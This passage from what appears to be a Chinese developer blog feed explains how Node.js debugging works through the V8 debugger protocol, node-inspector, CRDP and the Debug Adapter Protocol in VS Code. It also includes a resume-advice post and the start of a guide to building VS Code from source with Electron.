的断点调试，你是否有去思考过，为什么我打下一个断点，程序就会停下来，为什么在 VS Code 上不需要 Chrome Devtool 也能够断点，它背后是如何实现的？这就是文本要带你搞懂的东西。</p><h3 id="Node-js-的调试"><a href="#Node-js-的调试" class="headerlink" title="Node.js 的调试"></a>Node.js 的调试</h3><p>VS Code 上可以调试很多语言，安装对应的调试包即可，本文以 Node.js 为例，读者可以依葫芦画瓢，尝试下其他语言的调试，原理搞明白了，剩下的很多都是体力活。</p><p>首先，我们来看一看 Node.js 是如何被调试的，事实上本博客已经介绍过好多次了，这一次再更深入地探讨一下。</p><h4 id="连接-Node-js-的-Debugger"><a href="#连接-Node-js-的-Debugger" class="headerlink" title="连接 Node.js 的 Debugger"></a>连接 Node.js 的 Debugger</h4><p>在 6.3 版本以前的 Node.js，调试工具是比较单一的，社区比较活跃的调试工具叫 <code>node-inspector</code>，这玩意儿是个什么原理呢，为啥可以实现调试，我们可以通过几行简单的代码实现一个功能单一的 <code>node-inspector</code>，如下方是待调试的代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file: test.js</span></span><br><span class="line"><span class="keyword">let</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">write</span>(<span class="string">&#x27;hello\n&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">debugger</span>;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;world&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start server&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过 <code>node --debug test.js</code> 启动程序，我们启动了一个 8888 端口的 HTTP Server。</p><blockquote><p>此处请通过 nvm 将 node 的版本号切换到 6.3 以下，如 <code>v6.2.2</code> 这个版本，后面会讲旧版 Node 和 v6.3+ 版本 Node 的区别。</p></blockquote><p>然后通过如下方式发起请求：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ curl 127.0.0.1:8888</span><br></pre></td></tr></table></figure><p>你会看到命令行只输出了 <code>hello\n</code>，然后就进入了 pending 状态，我们来分步理解下，为啥会这样：</p><ul><li>通过 <code>--debug</code> 参数启动 Node.js，程序会开启一个内置的 <code>Debugger</code> 模块</li><li>由于我们没有指定参数，<code>--debug=PORT</code>，默认使用的是 5858 端口，此时的 <code>Debugger</code> 模块会监听 5858 端口</li><li>在发起请求的时候，遇到 <code>debugger</code> 关键词，程序会暂停执行，直到收到“继续到下一步”的指令</li></ul><blockquote><p>Demo 的源码地址：<a href="https://github.com/barretlee/node-legacy-debug">barretlee&#x2F;node-legacy-debug</a></p></blockquote><p>我们可以编写一个程序看看 <code>Debugger</code> 模块具体干了什么：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// File: debugClient.js</span></span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> socket = net.<span class="title function_">createConnection</span>(<span class="number">5858</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>())</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">process.<span class="property">stdin</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> json = data.<span class="title function_">toString</span>();</span><br><span class="line">  <span class="keyword">const</span> msg = <span class="string">`Content-Length: <span class="subst">$&#123;Buffer.byteLength(json, <span class="string">&#x27;utf8&#x27;</span>)&#125;</span>\r\n\r\n<span class="subst">$&#123;json&#125;</span>`</span>;</span><br><span class="line">  socket.<span class="title function_">write</span>(msg, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我们通过 <code>Net</code> 模块连接到刚才程序在 5858 端口开启的监听，刚连接上的时候，它会打印如下信息：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Type</span>: connect</span><br><span class="line">V8-<span class="keyword">Version</span>: <span class="number">5.0</span>.<span class="number">71.52</span></span><br><span class="line">Protocol-<span class="keyword">Version</span>: <span class="number">1</span></span><br><span class="line">Embedding-Host: <span class="keyword">node</span> <span class="title">v6</span>.<span class="number">2.2</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br></pre></td></tr></table></figure><p>意思是告诉你，你尝试与 Debugger 模块连接，已经连接成功了，当前 debug 的程序所使用的 V8 版本号是 <code>5.0.71.52</code>，使用的协议版本是 <code>1</code>，Node 的版本号是 <code>v6.2.2</code>，这个信息其实就是在告诉你，该使用什么协议与调试程序进行通讯，<code>v6.2.2</code> 的版本所用到的协议是 <a href="https://github.com/buggerjs/bugger-v8-client/blob/master/PROTOCOL.md">V8 Debugger Protocol</a>。</p><blockquote><p>为了打印全面的信息，注意操作的次序，先使用 debug 模块启动程序 test.js，然后启动 debugClient.js，最后再执行 curl 发起请求。</p></blockquote><p>在 curl 发起请求的时候，Debugger 会给 debugClient 发送一个消息：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">283</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;seq&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;event&quot;</span><span class="punctuation">,</span><span class="attr">&quot;event&quot;</span><span class="punctuation">:</span><span class="string">&quot;break&quot;</span><span class="punctuation">,</span><span class="attr">&quot;body&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;invocationText&quot;</span><span class="punctuation">:</span><span class="string">&quot;#&lt;Timeout&gt;._onTimeout()&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sourceLine&quot;</span><span class="punctuation">:</span><span class="number">9</span><span class="punctuation">,</span><span class="attr">&quot;sourceColumn&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;sourceLineText&quot;</span><span class="punctuation">:</span><span class="string">&quot;    debugger;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;script&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">59</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;/path/to/test.js&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lineOffset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;columnOffset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;lineCount&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>刚才的 <code>curl</code> 不是进入 pending 了么，我们尝试给 Debugger 发一个指令（参考<a href="https://github.com/buggerjs/bugger-v8-client/blob/master/PROTOCOL.md#request-continue---continuerequest_">协议内容</a>），告诉它进入下一个断点，内容为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;seq&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;request&quot;</span><span class="punctuation">,</span><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span><span class="string">&quot;continue&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在 debugClient 中我们监听了 <code>process.stdin</code>，所以可以直接将上述内容粘贴到命令行回车即可，同时你也会看到 Debugger 发过来的反馈：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;seq&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;request_seq&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;response&quot;</span><span class="punctuation">,</span><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span><span class="string">&quot;continue&quot;</span><span class="punctuation">,</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;running&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>告诉你，已经成功进入到了下一个断点，此时，你也会看到 curl 已经把 <code>world</code> 给输出了。</p><p>上面的程序，你可以在命令行输入其他指令，比如在暂停的时候查询 req 的 url 的值：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;seq&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;request&quot;</span><span class="punctuation">,</span><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span><span class="string">&quot;evaluate&quot;</span><span class="punctuation">,</span><span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;req.url&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>你会收到如下回复：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">177</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;seq&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;request_seq&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;response&quot;</span><span class="punctuation">,</span><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span><span class="string">&quot;evaluate&quot;</span><span class="punctuation">,</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;body&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;handle&quot;</span><span class="punctuation">:</span><span class="number">150</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;string&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">,</span><span class="attr">&quot;length&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;text&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;refs&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;running&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在你的脑海中是不是已经出现了平时调试 Node.js 的画面了，没错，它的原理就是这样的。</p><h4 id="node-inspector，调试代理"><a href="#node-inspector，调试代理" class="headerlink" title="node-inspector，调试代理"></a>node-inspector，调试代理</h4><p>调试原理大概已经弄明白了，但是我相信没有几个人愿意通过上面的方式来调试程序，因为那实在是太麻烦了，不仅得知道各种指令的名称，还得知道指令的参数、协议的规范、sequence 的计数等等，因此就有了 <code>node-inspector</code>，它可以帮助我们在 Chrome Devtool 上可视化地调试 Node.js 程序，那么它干了什么事情呢？</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">                                   +-----------------+</span><br><span class="line">                                   |  Node Program   |</span><br><span class="line">                                   +---------+-------+</span><br><span class="line">                                             ^</span><br><span class="line">                                             |</span><br><span class="line">+-----------------+                +---------+-------+</span><br><span class="line">|  Chrome Devtool |                | Node.js Debugger|</span><br><span class="line">+--------+--------+                +---------+-------+</span><br><span class="line">         |                                   ^</span><br><span class="line">         |                                   |</span><br><span class="line">       CRDP                                 V8DP</span><br><span class="line">         |      +-------------------+        |</span><br><span class="line">         +-----&gt;+   node inspector  +--------+</span><br><span class="line">                +-------------------+</span><br><span class="line"></span><br><span class="line">CRDP: Chrome Remote Debugging Protocol</span><br><span class="line">V8DP: V8 Debugging Protocol</span><br></pre></td></tr></table></figure><p>简单来说，<code>node inspector</code> 通过 Chrome 的 <code>Remote Debugging Protocol</code> 与 Chrome Devtool 建立了通道，然后通过 <code>V8 Debugging Protocol</code> 与程序的 <code>Debugger</code> 模块建立了连接，于是开发者就可以在 Chrome 上通过可视化操作来实现 Node.js 的调试了，所以我称它为“调试代理”，就是一个协议中转服务。</p><p>由于 <code>node-inspector</code> 很大程度提升了 Node 的调试体验，在 v6.3 的时候，Node.js 官方直接把这个能力给整合了进去。你会看到使用 v6.3+ 的 Node.js 中调试程序时，它会打印一个适配了 CRDP 协议的 webscoket 链接：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">➜ node --inspect test.js</span><br><span class="line">Debugger listening on ws:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9229</span>/db309268-<span class="number">623</span>a-<span class="number">4</span>abe-b19a-c4407ed8998d</span><br><span class="line">For help see https:<span class="regexp">//</span>nodejs.org<span class="regexp">/en/</span>docs/inspector</span><br></pre></td></tr></table></figure><p>我们可以直接在 Chrome Devtool 上配置这个地址进入可视化调试，于是整个链路就变成了：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+------------------+       +----------------+</span><br><span class="line">|                  |       |                |</span><br><span class="line">|  Chrome Devtool  |       |  Node Program  |</span><br><span class="line">|                  |       |           +-----------+</span><br><span class="line">+--------+---------+       +-----------+  Debugger |</span><br><span class="line">         |                             +-----+-----+</span><br><span class="line">         |                                   ^</span><br><span class="line">         |               CRDP                |</span><br><span class="line">         +-----------------------------------+</span><br></pre></td></tr></table></figure><p>少了调试代理的接入，开发者使用起来会轻松很多，而且 CRDP 规范在社区使用非常频繁，实现上有很多代码可以参考。</p><p>讲到这里，如果我们要自己实现一个可视化调试的界面，是不是就有点清晰了，：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+-----------------+        +----------------+</span><br><span class="line">|                 |        |                |</span><br><span class="line">|     My IDE      |        |  Node Program  |</span><br><span class="line">|      +----------+---+    |           +----+------+</span><br><span class="line">+------| Debug Client |    +-----------+  Debugger |</span><br><span class="line">       +----------+---+                +-----+-----+</span><br><span class="line">                  |                          ^</span><br><span class="line">                  |            CRDP          |</span><br><span class="line">                  +--------------------------+</span><br></pre></td></tr></table></figure><p>只需要实现下图的 <code>Debug Client</code> 部分，以及 <code>Debug Client</code> 与 IDE 的视图进行联动，就可以实现自定义的可视化的调试了。</p><blockquote><p>如果你的需求是自定义 Node.js 的可视化调试，本文看到这里就可以结束了，相信你利用上面学到的知识完全有能力去实现一个调试界面。但是在 VS Code 中，我们有必要再展开更多的篇幅。</p></blockquote><h3 id="Debug-Adaptor-Protocol"><a href="#Debug-Adaptor-Protocol" class="headerlink" title="Debug Adaptor Protocol"></a>Debug Adaptor Protocol</h3><p>实现一个 Debug Client 其实成本挺高的，你需要吃透所有的调试协议，如 V8 Debugging Protocol，包含了几十个指令，每个指令都需要进行通讯适配和 UI 适配，这还只是一种语言，如果你的 IDE 面向多种语言，你就需要适配多种调试协议，不同协议之前的差异可能还挺大的，这些工作完全会让你崩溃。</p><p>另外，站在社区的角度，这种建设是可以被抽象的，试想一下，Atom 调试 Node.js 需要自己实现一个 Debug Client，Sublime Text 如此、VS Code 如此，你自建 IDE 也是如此，是不是完全没必要，因此就有了 <code>Debug Adaptor Protocol</code>，它是微软提出的一套 <a href="https://microsoft.github.io/debug-adapter-protocol/">通用调试协议</a>，目前已经成为了社区的事实标准。</p><p>那这个 DAP 在调试的哪一层呢？我们可以看看这张图（<a href="https://microsoft.github.io/debug-adapter-protocol/overview">来源</a>）：</p><p><img src="/../blogimgs/2019/11/15/dap.png" alt="DAP"></p><p>在 IDE 上仅实现一次对 DAP 协议的通讯和 UI 适配，就可以调试所有的语言，你需要做的只有：</p><ul><li>社区有目标语言的 DAP 实现么，如果有，直接拿过来用，可以快速适配，搞定调试</li><li>如果没有，利用上面我们学到的知识，实现一个 DA，贡献给社区</li></ul><p>这套协议规范了 5 块内容：</p><ul><li><code>Base Protocol</code>，描述了请求、响应、事件、出错等通讯格式</li><li><code>Events</code>，描述了初始化、完成配置、输出、断点、停止等十几种事件标准</li><li><code>Request</code>，描述了调试的各种指令的请求格式</li><li><code>Response</code>，描述了调试的各种指令的响应格式</li><li><code>Types</code>，描述了以上各种内容中涉及到的类型和接口描述</li></ul><p>原则上，规范中提到的内容都需要在 DA 中实现，即便语言的底层引擎中没有这种能力，也应该抛一个错误出来，这样才能保证一致性。</p><h3 id="实现一个-Node-js-的调试器"><a href="#实现一个-Node-js-的调试器" class="headerlink" title="实现一个 Node.js 的调试器"></a>实现一个 Node.js 的调试器</h3><p>为了搞懂上面提到的几个协议，我动手写了一个 DEMO，实现了一个最简单的操作：展示当前 Debug 的堆栈信息，如下图所示：</p><p><img src="/../blogimgs/2019/11/15/debug-tracker.png" alt="Debug Demo"></p><blockquote><p>仓库地址是：<a href="https://github.com/barretlee/node-debug">barretlee&#x2F;node-debug</a></p></blockquote><p>可以下载下来跑一下，下载依赖后启动即可：</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">npm run init;</span><br><span class="line">npm run start;</span><br><span class="line">open http:<span class="comment">//127.0.0.1:4445</span></span><br></pre></td></tr></table></figure><p>这个 Demo 的完成度很低，而且关键环节都是 Mock 的，只是为了帮助自己理解整个过程，理解以后就没有继续去完善细节了，感兴趣的同学可以研究下。</p><p>我没有自己去实现完整一个 Node.js Debug Adaptor，倒不是因为复杂，直接去研究了下 VS Code 开源了两个 Adaptor，分别是：</p><ul><li><a href="https://github.com/microsoft/vscode-node-debug.git">vscode-node-debug</a>，这个是对 v6.3 以下版本的实现</li><li><a href="https://github.com/microsoft/vscode-node-debug2.git">vscode-node-debug2</a>，这个是对 v6.3 及以上版本的实现</li></ul><p>根据连接时返回的 <code>Embedding-Host</code> 信息来选择使用哪个版本，VS Code 好像会默认安装这两个包。整体思路跟我上面提到的是一样的。</p><h3 id="VS-Code-的具体实现"><a href="#VS-Code-的具体实现" class="headerlink" title="VS Code 的具体实现"></a>VS Code 的具体实现</h3><p>调试程序有两种方式，一种是调试已经启动的程序，另一种是调试未启动的程序，前者 VS Code 会直接 <code>attach</code> 上去，后者会先 fork 一个进程 <code>launch</code> 程序，这里只稍微介绍 VS Code 实际操作过程中的几个知识点：</p><h4 id="程序启动时没有带-debug-参数"><a href="#程序启动时没有带-debug-参数" class="headerlink" title="程序启动时没有带 debug 参数"></a>程序启动时没有带 debug 参数</h4><p>如果 Node.js 程序在启动的时候没有带 <code>--debug</code> 或者 <code>--inspect</code> 参数，默认情况下 Node.js 的 Debugger 模块是不会启动的，这种情况下并非就不能调试了，我们可以手动来启动调试模块：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到对应的 Node.js 进程的 PID</span></span><br><span class="line">➜ ps -aux | grep <span class="string">&#x27;node&#x27;</span></span><br><span class="line"><span class="comment"># 给这个 PID 发送 SIGUSR1 信号</span></span><br><span class="line">➜ <span class="built_in">kill</span> -SIGUSR1 NODE_PID</span><br></pre></td></tr></table></figure><h4 id="stopOnEntry"><a href="#stopOnEntry" class="headerlink" title="stopOnEntry"></a>stopOnEntry</h4><p>在 fork 一个 Node.js 进程进行调试的时候，有两类入参：</p><ul><li><code>--debug</code> 和 <code>--inspect</code>，默认执行程序</li><li><code>--debug-brk</code> 和 <code>--inspect-brk</code>，默认在第一行直接断点</li></ul><p>一般来说我们都会选择第一种，如果你的程序会直接执行完成，速度很快，可以考虑第二种方式进行调试。</p><h4 id="VS-Code-连接-Node-js-调试进程的方式"><a href="#VS-Code-连接-Node-js-调试进程的方式" class="headerlink" title="VS Code 连接 Node.js 调试进程的方式"></a>VS Code 连接 Node.js 调试进程的方式</h4><p>VS Code 调试 Node.js 的 Debug Adaptor 核心内容在 <a href="https://github.com/microsoft/vscode-chrome-debug-core">vscode-chrome-debug-core</a> 这个包中，它实际上是一个 Chrome Remote Debugging Protocol 的具体实现，_内部逻辑很多，看起来有点吃力_。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>好吧，先写到这里，还有很多细节问题就不一一叙述了，价值不大，写这篇文章做了不少前期工作，对 DAP 和 Node.js 的 Debugger 研究了好几个晚上，不过总算是搞的比较明白了，如果你在测试的时候遇到什么疑问，欢迎在 <a href="#comment">下方</a> 留言。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂谈 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个刚毕业的计算机相关专业学生，简历上有哪些经历会加分？</title>
      <link href="/blog/2019/11/07/resume-writing/"/>
      <url>/blog/2019/11/07/resume-writing/</url>
      
        <content type="html"><![CDATA[<p>有同学问我如何让简历加分，事实上这个问题之前分享过，再总结一下。<strong>下面的描述更多的是偏向于社招，不过对学生而言也有一定的参考价值。</strong></p><p>首先简历这个东西，只是一个敲门砖，我们的目的是让面试官看上去产生好感，然后给我们一个面试的机会，简历不需要表达全部的自己，面试官一定是从面试中获取大量的情报来深入了解你。所以简历写到什么程度，我们的目标是相当明确的。</p><p><strong>如何从简历中让人看出你【做成了】什么，以及你未来【可能做成】什么，以下几点可以参考</strong>：</p><ul><li>表达一件有挑战的完整的事情，比如实现了一个平台的架构推导和落地，再如使用三个月时间经历四轮优化将系统的整体性能提升了 1.5 倍等等；而不是我写了某个网站的前端，沉淀了五个通用组件等等；</li><li>展示你跨专业的特性，比如作为前端工程师，我在运维工作上做了比较突出的贡献；在图形图像方面有深入研究和良好产出；曾并发管理 5 个中型项目并保证准时交付等等；</li><li>从业务价值的角度去发现问题和分析问题，比如通过融合两个相似系统后，降低了运营的成本，提高了数据从线下到线上展示的效率等；而不是简单地说，实现了数据层的合并，统一了前台交互等这种纯技术的表达；</li></ul><p><strong>说到底，还是需要让面试官看到你这几方面的能力</strong>：</p><ol><li>技术综合能力&#x2F;学习能力（硬实力）</li><li>业务洞察力（理解力）</li><li>拿结果的能力（执行力）</li></ol><p><strong>看过不少简历，优秀的人大概都有这么一些特征（具备两三条甚至更多）</strong>：</p><ol><li>名企呆过，有大厂背书</li><li>参与的项目非常有震撼力</li><li>在技术领域跨度大的项目有成绩</li><li>有门槛的技术领域里有沉淀</li><li>技术产出对团队&#x2F;业务有突出的影响</li><li>接二连三的专利</li><li>拿过一些很难拿到的奖项</li><li>非常好的韧劲，某一&#x2F;几件事情上坚持不懈</li><li>思考力惊人，行动力惊人</li><li>思维敏捷且逻辑无比严谨</li><li>具备一定的社区影响力</li></ol><p>希望对你有些帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>带你开发和调试 VS Code 源码</title>
      <link href="/blog/2019/11/01/vscode-study-02-debugging/"/>
      <url>/blog/2019/11/01/vscode-study-02-debugging/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.barretlee.com/blog/2019/10/23/vscode-study-01-start/">上文</a> 给大家介绍了如何在本地从源码启动 VS Code，笔者在更换电脑后重新安装依赖时又遇到了文中插曲里提到的问题，VS Code 依赖的很多资源都在 Github 上，而且有好几个模块都需要下载源码重新编译，安装依赖失败的概率还是略大的。</p><p>如果依赖的包构建失败，不用担心，等到启动的时候它会提示详细错误：</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[<span class="number">92850</span>:<span class="number">1031</span>/<span class="number">221458.947969</span>:INFO:CONSOLE(<span class="number">17</span>)] </span><br><span class="line"><span class="comment">&quot;Error: The module &#x27;~/vscode/node_modules/spdlog/build/Release/spdlog.node&#x27;</span></span><br><span class="line">was compiled against <span class="keyword">a</span> different Node.js <span class="keyword">version</span> using</span><br><span class="line">NODE_MODULE_VERSION <span class="number">73</span>. This <span class="keyword">version</span> of Node.js requires</span><br><span class="line">NODE_MODULE_VERSION <span class="number">69</span>. Please <span class="keyword">try</span> re-compiling <span class="built_in">or</span> re-installing</span><br></pre></td></tr></table></figure><p>如上，是 <code>spdlog</code> 安装失败了，可以通过 <code>yarn add spdlog</code> 重新安装，如果一直报错，请注意 Node.js 的版本，我使用的是 <code>v10.6.0</code>，编译的是 tag 为 <code>1.39.2</code> 的 VS Code 源码，没遇到问题。</p><blockquote><p>测试过几次，当我切换 VS Code 的版本（git tag）时，似乎 spdlog 和 vscode-sqlite3 这两个包的安装总是存在问题，按照上述方式重新安装和编译下就行了。</p></blockquote><h3 id="Main-和-Renderer"><a href="#Main-和-Renderer" class="headerlink" title="Main 和 Renderer"></a>Main 和 Renderer</h3><p>倘若你之前没有 Electron 的开发经验，这个段落不容错过。</p><blockquote><p>如果你可以建一个网站，你就可以建一个桌面应用程序。 Electron 是一个使用 JavaScript, HTML 和 CSS 等 Web 技术创建原生程序的框架，它负责比较难搞的部分，你只需把精力放在你的应用的核心上即可。</p></blockquote><p>Electron 是个什么东西？官方对它的定义是：“使用 JavaScript, HTML 和 CSS 构建跨平台的桌面应用”。</p><p><img src="/../blogimgs/2019/11/01/electreon-structure.png" alt="Electron Structure"></p><p>打开 Electron 的 <a href="https://electronjs.org/docs">文档</a>，从文档目录中，你大致就能够知道 Electron 可以做什么。Electron 有两大模块，<code>Main Process</code> 和 <code>Renderer Process</code>，暴露出来的上层 API 并不多，我数了一下，约摸 30 个。搞懂这 30 个 API 可能不是什么难事，但是在搞清楚 API 之前，我们需要先知道这两大模块之间是如何交互和协作的，以帮助我们更好地理解。</p><p>打开官方的 quick start demo：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/electron/electron-quick-start</span><br><span class="line"><span class="comment"># 进入仓库</span></span><br><span class="line">$ <span class="built_in">cd</span> electron-quick-start</span><br><span class="line"><span class="comment"># 安装依赖库</span></span><br><span class="line">$ npm install</span><br><span class="line"><span class="comment"># 运行应用</span></span><br><span class="line">$ npm start</span><br></pre></td></tr></table></figure><p>你会看到两个核心文件，一个是 <code>main.js</code>，另外一个是 <code>index.html</code>，你完全可以这么理解：前者跑的是 Main Process，它的执行环境是一个 <code>Node</code> 环境；后者跑的是 Renderer Process，它的执行环境是一个 <code>Chromium + Node</code> 环境，也就是说，我们写的 <code>index.html</code> 中可以去调用 Node.js 的模块，这也是 Electron 与普通浏览器的主要差别。</p><p>Main 进程中可以通过 <code>BrowserWindow</code> 实例化多个 Renderer 进程，且每个 Renderer 进程相关独立，在复杂的项目中会涉及到了很多通信问题，比如 Main-Renderer 通讯，Renderer-Main 通讯，Renderer-Renderer 通讯，VS Code 中就有很多这类问题的优秀解决方案，不过不在我们今天的讨论范畴中。</p><p>Main 和 Renderer 之间的关系，可以用这种图来形容（<a href="http://jlord.us/essential-electron/">图片来源</a>）：</p><p><img src="/../blogimgs/2019/11/01/main-and-renderer.png" alt="Main and Renderer"></p><p>对于 Electron，先了解这么多知识，如果你期望了解更多，可以移步 <a href="https://electronjs.org/docs">Electron 官方文档</a>。</p><h3 id="初识-VS-Code"><a href="#初识-VS-Code" class="headerlink" title="初识 VS Code"></a>初识 VS Code</h3><p>很多同学对 VS Code 已经熟悉得不能再熟悉了，谈不上初识，不过我们这里说的“初识”是针对它的架构和源码，相信对大多数人来说，它依然是陌生的。</p><p>先看看项目的整体目录结果，过滤了几个次要项：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── azure-pipelines<span class="selector-class">.yml</span></span><br><span class="line">├── build/</span><br><span class="line">├── extensions/</span><br><span class="line">├── gulpfile<span class="selector-class">.js</span></span><br><span class="line">├── out/</span><br><span class="line">├── package<span class="selector-class">.json</span></span><br><span class="line">├── product<span class="selector-class">.json</span></span><br><span class="line">├── resources/</span><br><span class="line">├── scripts/</span><br><span class="line">├── <span class="attribute">src</span>/</span><br><span class="line">│   ├── <span class="selector-tag">main</span><span class="selector-class">.js</span></span><br><span class="line">│   └── vs</span><br><span class="line">│       ├── base/</span><br><span class="line">│       ├── code/</span><br><span class="line">│            ├── browser/</span><br><span class="line">│                 ├── workbench<span class="selector-class">.ts</span></span><br><span class="line">│                 └── workbench/workbench<span class="selector-class">.html</span></span><br><span class="line">│            